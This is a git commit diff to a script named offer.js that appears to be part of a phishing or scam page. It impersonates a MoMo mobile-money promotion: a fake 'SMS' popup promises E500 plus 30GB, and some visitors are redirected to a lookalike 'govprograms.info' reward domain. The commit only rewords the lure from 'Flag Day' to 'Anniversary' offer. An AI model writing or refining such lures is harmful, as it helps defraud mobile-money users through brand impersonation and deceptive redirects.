be7ee2fff67fb538c0c7e642c75aa95b1a1e99f2
uptomars <Kenoly555+me@gmail.com>
2025-05-05 07:18:57 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'E500 + 30GB'
-password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive E500 + 30GB MoMo Flag Day Offer, Kindly Press OK to PROCEED ','E500 + 30GB');
+password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive E500 + 30GB MoMo Anniversary Offer, Kindly Press OK to PROCEED ','E500 + 30GB');
 if (password != 'E500 + 30GB') {
 location.href='https://momo-reward.govprograms.info/gift';
 }
